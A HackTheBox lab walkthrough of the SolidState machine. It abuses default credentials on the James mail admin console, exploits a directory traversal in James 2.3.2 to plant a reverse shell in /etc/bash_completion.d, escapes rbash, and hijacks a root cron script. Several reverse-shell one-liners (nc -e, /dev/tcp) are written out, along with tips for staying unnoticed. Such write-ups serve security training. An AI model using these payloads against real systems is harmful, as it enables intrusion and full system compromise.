---
title: HTB: SolidState
url: https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html
date: 2020-04-30T10:00:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, ctf, htb-solidstate, nmap, james, pop3, smtp, bash-completion, ssh, rbash, credentials, directory-traversal, cron, pspy, oscp-like-v2, oscp-like-v1
---

![SolidState](https://0xdfimages.gitlab.io/img/solidstate-cover.png)

The biggest trick with SolidState was not focusing on the website but rather moving to a vulnerable James mail client. In fact, if I take advantage of a restrictred shell escape, I don’t even need to exploit James, but rather just use the admin interface with default creds to gain access to the various mailboxes, find SSH creds, escape rbash, and continue from there. But I will also show how to exploit James using a directory traversal vulnerability to write a bash completion script and then trigger that with a SSH login. For root, there’s a cron running an writable python script, which I can add a reverse shell to. In Beyond Root, I’ll look at payloads for the James exploit, both exploring what didn’t work, and improving the OPSEC.

## Box Info

| Name | [SolidState](https://hackthebox.com/machines/solidstate)  [SolidState](https://hackthebox.com/machines/solidstate) [Play on HackTheBox](https://hackthebox.com/machines/solidstate) |
| --- | --- |
| Release Date | 08 Sep 2017 |
| Retire Date | 27 Jan 2018 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creator | [ch33zplz ch33zplz](https://app.hackthebox.com/users/3338) |

## Recon

### nmap

`nmap` shows six open TCP ports, SSH (22), SMTP (25), HTTP (80), POP3 (110), NNTP (119), and James admin (4555):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.51
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-23 21:43 EDT
Warning: 10.10.10.51 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.51
Host is up (0.043s latency).
Not shown: 63032 closed ports, 2497 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip

Nmap done: 1 IP address (1 host up) scanned in 28.67 seconds
root@kali# nmap -p 22,25,80,110,119,4555 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.51
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-23 21:48 EDT
Nmap scan report for 10.10.10.51
Host is up (0.024s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.47 [10.10.14.47]), 
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.52 seconds

```

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) and [Apache](https://packages.debian.org/search?keywords=apache2) versions, this looks like Debian 9 stretch.

### Website - TCP 80

#### Site

The site is for Solid State security.

[![Solid State Security](https://0xdfimages.gitlab.io/img/image-20200426142601193.png)](https://0xdfimages.gitlab.io/img/image-20200426142601193.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200426142601193.png)

In addition to `index.html` (above), there are two other pages, `services.html` and `about.html`. Each has a lot of text, and each of the three have a form at the bottom:

![image-20200426142739394](https://0xdfimages.gitlab.io/img/image-20200426142739394.png)

The contact form is interesting, but it just submits a POST to `/`, which returns the main page. It doesn’t seem like it’s doing anything.

#### Directory Brute Force

`gobuster` doesn’t find anything else of interest:

```

root@kali# gobuster dir -u http://10.10.10.51/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x html -o scans/gobuster-root-html-small -t 40 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.51/
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html
[+] Timeout:        10s
===============================================================
2020/04/26 14:16:48 Starting gobuster
===============================================================
/index.html (Status: 200)
/images (Status: 301)
/about.html (Status: 200)
/services.html (Status: 200)
/assets (Status: 301)
===============================================================
2020/04/26 14:18:00 Finished
===============================================================

```

At this point I’ll move on from HTTP.

### James Mail Server - TCP 25/110/119/4555

James Mail Server is listening on four ports with different functions. Simple Mail Transfer Protocol (SMTP) on TCP 25, Post Office Protocol (POP3) on TCP 110, and Network News Transfer Protocol (NNTP) on TCP 119 are all services that this box is offering. I could look at potentially brute forcing valid user names or sending phishing emails, but first I want to look at port 4555.

TCP port 4555 is interesting because it is the James administration port. Even without an exploit, if I can access this service, I can likely get into things that might be useful. That said, I’ll first check `searchsploit`. `nmap` identified this as version 2.3.2, and there’s a match on an RCE exploit:

```

root@kali# searchsploit james
------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                    |  Path
                                                                  | (/usr/share/exploitdb/)
------------------------------------------------------------------ ----------------------------------------
Apache James Server 2.2 - SMTP Denial of Service                  | exploits/multiple/dos/27915.pl
Apache James Server 2.3.2 - Insecure User Creation Arbitrary File | exploits/linux/remote/48130.rb
Apache James Server 2.3.2 - Remote Command Execution              | exploits/linux/remote/35513.py
WheresJames Webcam Publisher Beta 2.0.0014 - Remote Buffer Overfl | exploits/windows/remote/944.c
------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result

```

## Shell as mindy

### James Admin –> Mail Access

I can connect to 4555 with `nc`, and I’m prompted to login. The default creds of root/root work:

```

root@kali# nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands

```

I can get the list of commands with `help`:

```

help
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection

```

I can list users to see five accounts:

```

listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin

```

I can change the password for each:

```

setpassword -h
Usage: setpassword [username] [password]
setpassword james 0xdf0xdf
Password for james reset
setpassword thomas 0xdf0xdf
Password for thomas reset
setpassword john 0xdf0xdf
Password for john reset
setpassword mindy 0xdf0xdf
Password for mindy reset
setpassword mailadmin 0xdf0xdf
Password for mailadmin reset

```

For each account, I can now connect to TCP 110 (POP3) to check mail. `telnet` works best to connect to POP3. The first user, james, has no messages:

```

root@kali# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER james
+OK
PASS 0xdf0xdf
+OK Welcome james
LIST
+OK 0 0
.

```

I’ll quit (CTRL+] followed by entering `quit`), and move on to the next user. No mail in thomas either, but john does show one message:

```

root@kali# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER john
+OK
PASS 0xdf0xdf
+OK Welcome john
LIST
+OK 1 743
1 743
.

```

I’ll use the `RETR` command to read it:

```

RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James

.

```

Good to know. I’ll want to check mindy’s account, which is next on my list anyway. mindy shows two emails:

```

root@kali# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS 0xdf0xdf
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.

```

The first is a welcome email from mailadmin through signed James:

```

RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.

```

The second, also from mailadmin signed James, contains SSH credentials, and mentions a restricted shell:

```

RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,

Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.

```

mailadmin, despite the juicy username, doesn’t have any email.

### SSH as mindy

I can use the creds from the email to connect over SSH as mindy:

```

root@kali# sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Apr 29 21:12:15 2020 from 10.10.14.47
mindy@solidstate:~$

```

As the email suggested, the shell is limited:

```

mindy@solidstate:~$ whoami
-rbash: whoami: command not found
mindy@solidstate:~$ id
-rbash: id: command not found

```

`/etc/passwd` shows that mindy’s shell is `rbash`:

```

mindy@solidstate:~$ cat /etc/passwd
...[snip]...
mindy:x:1001:1001:mindy:/home/mindy:/bin/rbash

```

Even in `rbash`, I can grab `user.txt`:

```

mindy@solidstate:~$ ls
bin  user.txt
mindy@solidstate:~$ cat user.txt
914d0a4e************************

```

## rbash Escape

### Quick Method

The first thing I try when facing SSH into `rbash` is adding `-t bash` to the SSH connection command. This will run `bash` on connect instead of the assigned shell. It works here (though it does produce a busted prompt), and I an now run `id` and `cd`:

```

root@kali# sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51 -t bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cd /
${debian_chroot:+($debian_chroot)}mindy@solidstate:/$ ls
bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old

```

### Intended Path

#### Exploit Theory

I believe the intended path was to take advantage of the James 2.3.2 exploit, which I’ll show now. First, I’ll take a look at the exploit from `searchsploit`.

When a user is created in James, a folder is created for that user based on their username, and when email comes in, it is stored in that folder. The issue is that no bounds checking is done on that user name, so if the user is named `../../../../../../../0xdf`, then it will create that folder at the root level and drop files in it with the contents of received emails.

The question then becomes, how can I use this semi-arbitrary root write access to my advantage? I can control the folder that’s written into, but not fully the filename. This eliminates ideas like writing a public key into `/root/.ssh/authorized_keys` or changing the `/etc/sudoers` or `/etc/passwd` files.

The solution the script authors came up with is a good one. Bash completion scripts provide custom tab completion for various commands. For example, when I type `git stat[tab]`, it auto completes `git status` based on a git bash completion script that runs each time a session starts on my host. In fact, a few weeks ago I was looking at writing custom bash completion scripts, and it’s not hard. I tweeted a really nice overwview post:

> Creating some scripts to manage things, and wanted to add tab complete for the options. It was super easy. This article was a really good overview:<https://t.co/6LHD16wT5l>
>
> — 0xdf (@0xdf\_) [April 12, 2020](https://twitter.com/0xdf_/status/1249390368640192515?ref_src=twsrc%5Etfw)

Anyway, by writing to `/etc/bash_completion.d`, when any user logs in, that user will run each file in there as a `bash` script.

#### Script Review

Opening the script, I see exactly the process as described above:

[![James Exploit Notes](https://0xdfimages.gitlab.io/img/james-exploit.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/james-exploit.png)

#### Manual Exploitation

Seeing what the script does, I’ll try this manually with `nc` and `telnet`. First, create a user:

```

root@kali# nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
adduser ../../../../../../../../etc/bash_completion.d 0xdf0xdf
User ../../../../../../../../etc/bash_completion.d added
quit
Bye

```

Now, I’ll send that user an email with a reverse shell, connecting to SMTP on 25:

```

root@kali# telnet 10.10.10.51 25
Trying 10.10.10.51...  
Connected to 10.10.10.51.     
Escape character is '^]'.              
220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Wed, 29 Apr 2020 22:28:40 -0400 (EDT)
EHLO 0xdf
250-solidstate Hello 0xdf (10.10.14.47 [10.10.14.47])
250-PIPELINING                            
250 ENHANCEDSTATUSCODES
MAIL FROM: <'0xdf@10.10.14.47>
250 2.1.0 Sender <'0xdf@10.10.14.47> OK 
RCPT TO: <../../../../../../../../etc/bash_completion.d>
250 2.1.5 Recipient <../../../../../../../../etc/bash_completion.d@localhost> OK
DATA
354 Ok Send data ending with <CRLF>.<CRLF>               
FROM: 0xdf@10.10.14.47            
'
/bin/nc -e /bin/bash 10.10.14.47 443
.
250 2.6.0 Message received                          
quit                                                      
221 2.0.0 solidstate Service closing transmission channel
Connection closed by foreign host.     

```

This creates a file in `/etc/bash_completion.d` that contains my reverse shell. So the next time any user logs in, I’ll get a shell as that user. It is important to add the `'` at the start of the first header, `MAIL FROM`. Then I close that `'` just before my payload. Later, when this file is run by `bash`, that will lump all those lines into one broken command, which will fail and continue. Without the `'`, there are lines that will crash and break the script before the reverse shell can run.

I had to play with payloads to get this working, and I’ll explore this a bit in [Beyond Root](#curious-case-of-devtcp). I did find when doing things manually, `/bin/nc -e /bin/bash 10.10.14.47 443` worked, where as others didn’t. When using the Python script, several payloads worked. That seems to have to do with the way the Python script can add `\r`.

#### Trigger -> Shell

Now I can SSH as mindy, and trigger the code. There are new `rbash` errors from the exploit, and then the terminal just hangs:

```

root@kali# sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
-rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found
-rbash: L: command not found
-rbash: attributestLjava/util/HashMap: No such file or directory
-rbash: L
         errorMessagetLjava/lang/String: No such file or directory
-rbash: L
         lastUpdatedtLjava/util/Date: No such file or directory
-rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory
-rbash: $'L\004nameq~\002L': command not found
-rbash: recipientstLjava/util/Collection: No such file or directory
-rbash: L: command not found
-rbash: $'remoteAddrq~\002L': command not found
-rbash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory
-rbash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': command not found
-rbash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': command not found
-rbash: 0xdf@10.10.14.47>
Message-ID: <4054205.0.1588213770563.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost
Received: from 10.10.14.47 ([10.10.14.47])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 148
          for <../../../../../../../../etc/bash_completion.d@localhost>;
          Wed, 29 Apr 2020 22:29:30 -0400 (EDT)
Date: Wed, 29 Apr 2020 22:29:30 -0400 (EDT)
FROM: 0xdf@10.10.14.47
: No such file or directory

```

You can see in the error that it’s trying to run everything from `0xdf@10.10.14.47` to the `FROM: 0xdf@10.10.14.47` as one command, due to the added `'`.

At my `nc` listener, I got a shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )              
Ncat: Listening on :::443                                 
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.51.          
Ncat: Connection from 10.10.10.51:49590.
python -c 'import pty;pty.spawn("bash")'
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$

```

I’ll look at improving the experience for mindy in [Beyond Root](#better-user-experience).

## Priv: mindy –> root

### Enumeration

In just looking around the file system, I usually check `/opt` and `/srv`, expecting to find both empty on most HTB machines. So finding a world-writable root-owned Python script in `/opt` caught my eye:

```

${debian_chroot:+($debian_chroot)}mindy@solidstate:/$ ls -l /opt/
total 8
drwxr-xr-x 11 root root 4096 Aug 22  2017 james-2.3.2
-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py

```

The script itself doesn’t do anything too interesting:

```

#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()

```

### PSpy

Given that file, I want to see if it’s being run, so I’ll upload [PSpy](https://github.com/DominicBreuker/pspy). I’ll start a Python webserver in my Pspy directory, and then grab the file with `wget` (grabbing the 32 bit version since this machine is 32 bit):

```

${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ wget 10.10.14.47/pspy32
--2020-04-29 22:39:06--  http://10.10.14.47/pspy32
Connecting to 10.10.14.47:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2656352 (2.5M) [application/octet-stream]
Saving to: ‘pspy32’

pspy32                        100%[=================================================>]   2.53M  9.42MB/s    in 0.3s    

2020-04-29 22:39:07 (9.42 MB/s) - ‘pspy32’ saved [2656352/2656352]

```

I see the request on the webserver:

```

root@kali:/opt/pspy# ls
pspy32  pspy32s  pspy64  pspy64s
root@kali:/opt/pspy# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.51 - - [29/Apr/2020 22:37:02] "GET /pspy32 HTTP/1.1" 200 -

```

Now `chmod` and run:

```

${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ./pspy32
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855

     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░     
Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2020/04/29 22:39:40 CMD: UID=0    PID=997    | /usr/sbin/cups-browsed
...[snip]...

```

Every three minutes I see:

```

2020/04/29 22:42:01 CMD: UID=0    PID=1104   | /usr/sbin/CRON -f 
2020/04/29 22:42:01 CMD: UID=0    PID=1105   | /usr/sbin/CRON -f 
2020/04/29 22:42:01 CMD: UID=0    PID=1106   | /bin/sh -c python /opt/tmp.py 
2020/04/29 22:42:02 CMD: UID=0    PID=1107   | python /opt/tmp.py 
2020/04/29 22:42:02 CMD: UID=0    PID=1108   | sh -c rm -r /tmp/*
2020/04/29 22:45:01 CMD: UID=0    PID=1150   | /usr/sbin/CRON -f 
2020/04/29 22:45:01 CMD: UID=0    PID=1151   | /usr/sbin/CRON -f 
2020/04/29 22:45:01 CMD: UID=0    PID=1152   | /bin/sh -c python /opt/tmp.py 
2020/04/29 22:45:01 CMD: UID=0    PID=1153   | python /opt/tmp.py 
2020/04/29 22:45:01 CMD: UID=0    PID=1154   | sh -c rm -r /tmp/*  

```

root is running this file.

### Exploit

I’ll modify the file to add a reverse shell into it:

```

#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
os.system('bash -c "bash -i >& /dev/tcp/10.10.14.47/443 0>&1"')

```

This last line should initiate a shell back to me once root runs it. At the next turn of three minutes, I get a connection:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.51.
Ncat: Connection from 10.10.10.51:49594.
bash: cannot set terminal process group (1170): Inappropriate ioctl for device
bash: no job control in this shell
root@solidstate:~# id
uid=0(root) gid=0(root) groups=0(root)

```

And can grab `root.txt`:

```

root@solidstate:~# cat root.txt
b4c9723a************************

```

## Beyond Root

### Curious Case of /dev/tcp

Originally the first reverse shell payload I tried was `bash -i >& /dev/tcp/10.10.14.47/443 0>&1`. I set it manually:

```

root@kali# telnet 10.10.10.51 25
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Wed, 29 Apr 2020 23:28:35 -0400 (EDT)
EHLO 0xdf
250-solidstate Hello 0xdf (10.10.14.47 [10.10.14.47])
250-PIPELINING
250 ENHANCEDSTATUSCODES
MAIL FROM: <'0xdf@10.10.14.47>
250 2.1.0 Sender <'0xdf@10.10.14.47> OK
RCPT TO: <../../../../../../../../etc/bash_completion.d>
250 2.1.5 Recipient <../../../../../../../../etc/bash_completion.d@localhost> OK
DATA
354 Ok Send data ending with <CRLF>.<CRLF>
FROM: 0xdf@10.10.14.47

'
bash -i >& /dev/tcp/10.10.14.47/443 0>&1

.
250 2.6.0 Message received
quit
221 2.0.0 solidstate Service closing transmission channel
Connection closed by foreign host.

```

And then triggered it, but got errors and the connection died:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.51.
Ncat: Connection from 10.10.10.51:49650.
: ambiguous redirect363837383831322D35.Repository.FileStreamStore: line 16: 1

```

However, when I tried the same payload in the `searchsploit` script, it worked. It was driving me crazy, so I went to look at the different payloads.

For each email received by the account, there are two files in the user’s directory (for this user, that’s `/etc/bash_completion.d`), a Object Store and a Stream Store. For example:

```

root@solidstate:/etc/bash_completion.d# ls
4D61696C313538383231373936323331372D38.Repository.FileObjectStore  4D61696C313538383231373936323331372D38.Repository.FileStreamStore

```

The Stream Store is the one that contains the payload. It looks like a raw email:

```

Return-Path: <'0xdf@10.10.14.47>
Message-ID: <8915397.8.1588217962318.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost
Received: from 10.10.14.47 ([10.10.14.47])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 252
          for <../../../../../../../../etc/bash_completion.d@localhost>;
          Wed, 29 Apr 2020 23:39:07 -0400 (EDT)
Date: Wed, 29 Apr 2020 23:39:07 -0400 (EDT)
FROM: 0xdf@10.10.14.47

'
/bin/nc -e /bin/bash 10.10.14.47 443 &

```

To try to figure out why the scripted version worked while the manual version didn’t, with both emails sitting in `/etc/bash_completion.d`, I ran `diff`:

```

root@solidstate:/etc/bash_completion.d# diff 4D61696C313538383231363034383637362D33.Repository.FileStreamStore 4D61696C313538383231363132353231352D34.Repository.FileStreamStore
1,2c1,2
< Return-Path: <'0xdf@10.10.14.47>
< Message-ID: <22085305.3.1588216048676.JavaMail.root@solidstate>
---
> Return-Path: <'@team.pl>
> Message-ID: <9571892.4.1588216125216.JavaMail.root@solidstate>
8c8
<           by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 614
---
>           by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 47
10,12c10,12
<           Wed, 29 Apr 2020 23:07:28 -0400 (EDT)
< Date: Wed, 29 Apr 2020 23:07:28 -0400 (EDT)
< FROM: 0xdf@10.10.14.47
---
>           Wed, 29 Apr 2020 23:08:45 -0400 (EDT)
> Date: Wed, 29 Apr 2020 23:08:45 -0400 (EDT)
> From: team@team.pl
14,15c14,15
< '
< bash -i >& /dev/tcp/10.10.14.47/443 0>&1
---
> '
> bash -i >& /dev/tcp/10.10.14.47/443 0>&1

```

It all seemed superficial, such as the ID or the from address, until the last difference, which, didn’t look different at all. I opened them both in `vi` to see if there was something missing, and there was a subtle difference:

| Script | Manual |
| --- | --- |
| image-20200429231545372 | image-20200429233306700 |

In my manual interaction, there’s extra carriage returns (`\r`, printed as `^M` in `vi`) after the `'` and after the payload. I don’t quite know why that made such a difference, but removing the two `^M` in vi (putting the cursor over the character and pushing `x`) made it work. I could test it by running `bash 4D61696C313538383231373333333237352D37.Repository.FileStreamStore`.

### Better User Experience

It bugged me a little bit that when I connected SSH as mindy, the SSH shell just hung while I worked on my `nc` shell. I wanted to see if I could start a payload that didn’t ruin the user’s SSH connection. In a real situation, I wouldn’t want to break the user’s experience and draw attention to myself.

The best way to do this was with the `nc -e` payload. I found that if I added a trailing `&`, it would start the process in the background and allow the triggering process to continue. The email looks like:

```

Return-Path: <'0xdf@10.10.14.47>^M
Message-ID: <8915397.8.1588217962318.JavaMail.root@solidstate>^M
MIME-Version: 1.0^M
Content-Type: text/plain; charset=us-ascii^M
Content-Transfer-Encoding: 7bit^M
Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost^M
Received: from 10.10.14.47 ([10.10.14.47])^M
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 252^M
          for <../../../../../../../../etc/bash_completion.d@localhost>;^M
          Wed, 29 Apr 2020 23:39:07 -0400 (EDT)^M
Date: Wed, 29 Apr 2020 23:39:07 -0400 (EDT)^M
FROM: 0xdf@10.10.14.47^M
^M
'^M
/bin/nc -e /bin/bash 10.10.14.47 443 &^M

```

mindy’s SSH session has some extra junk text, but the prompt comes in live immediately:

```

root@kali# sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Apr 29 22:44:26 2020 from 10.10.14.47
-rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found
-rbash: L: command not found
-rbash: attributestLjava/util/HashMap: No such file or directory
-rbash: L
         errorMessagetLjava/lang/String: No such file or directory
-rbash: L
         lastUpdatedtLjava/util/Date: No such file or directory
-rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory
-rbash: $'L\004nameq~\002L': command not found
-rbash: recipientstLjava/util/Collection: No such file or directory
-rbash: L: command not found
-rbash: $'remoteAddrq~\002L': command not found
-rbash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory
-rbash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': command not found
